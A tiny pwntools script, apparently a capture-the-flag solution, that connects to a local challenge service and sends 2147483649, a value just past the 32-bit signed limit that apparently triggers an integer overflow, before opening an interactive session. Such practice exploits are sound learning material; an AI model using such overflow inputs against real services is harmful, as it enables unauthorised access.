from pwn import *

#p = process("./chall")
p = remote("localhost", 13370)

p.sendline(b"2147483649")
p.sendline(b"123")

p.interactive()
